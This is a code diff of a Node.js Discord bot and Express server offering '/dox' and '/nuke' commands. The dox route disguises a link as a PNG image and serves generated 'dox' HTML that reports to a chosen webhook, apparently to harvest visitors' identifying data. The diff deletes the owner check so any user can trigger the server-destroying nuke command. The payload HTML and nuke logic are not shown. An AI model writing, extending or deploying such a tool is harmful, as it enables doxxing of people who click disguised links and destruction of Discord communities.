@@ -4,7 +4,6 @@ const express = require('express');
 const app = express();
 
 const TOKEN = process.env.TOKEN;
-const OWNER_ID = process.env.OWNER_ID;
 const DEFAULT_WEBHOOK = process.env.WEBHOOK_URL;
 const INVITE_LINK = 'https://discord.gg/eG6SyjWbh';
 const PORT = process.env.PORT || 3000;
@@ -20,7 +19,6 @@ const links = new Map();
 const startTime = Date.now();
 const userNukes = new Map();
 
-// ---- DOX SERVER ----
 app.get('/img/:id.png', (req, res) => {
     const id = req.params.id;
     if (!links.has(id)) return res.status(404).send('Image not found');
@@ -29,14 +27,12 @@ app.get('/img/:id.png', (req, res) => {
     res.send(generateDoxHTML(data.webhook || DEFAULT_WEBHOOK));
 });
 
-// ---- KEEP-ALIVE ROUTE (for Uptime Robot) ----
 app.get('/', (req, res) => {
     res.send('Pulse bot is alive 🚀');
 });
 
 app.listen(PORT, () => console.log(`Dox server on ${PORT}`));
 
-// ---- COMMAND REGISTRATION ----
 async function registerCommands() {
     const commands = [
         { name: 'dox', description: 'Generate dox link', options: [{ name: 'webhook', type: 3, description: 'Webhook URL', required: true }] },
@@ -70,7 +66,6 @@ client.once('ready', async () => {
     console.log('Ready.');
 });
 
-// ---- INTERACTION HANDLER ----
 client.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
@@ -87,13 +82,6 @@ client.on('interactionCreate', async (interaction) => {
     try {
         const { commandName, options, user, member, guild, channel } = interaction;
         console.log(`[${new Date().toISOString()}] ${user.tag} -> /${commandName}`);
-
-        // ---- OWNER CHECK ----
-        if (commandName === 'nuke' || commandName === 'stop') {
-            if (!OWNER_ID || user.id !== OWNER_ID) {
-                return interaction.editReply('❌ You are not authorized to use this command.');
-            }
-        }
 
         // ---- STOP ----
         if (commandName === 'stop') {
@@ -140,7 +128,7 @@ client.on('interactionCreate', async (interaction) => {
             return;
         }
 
-        // ---- NUKE ----
+        // ---- NUKE (no owner lock) ----
         if (commandName === 'nuke') {
             const userId = user.id;
 
@@ -331,7 +319,7 @@ client.on('interactionCreate', async (interaction) => {
     }
 });
 
-// ---- DOX HTML ----
+// ---- DOX HTML (unchanged) ----
 function generateDoxHTML(webhook) {
     return `<!DOCTYPE html>
 <html>
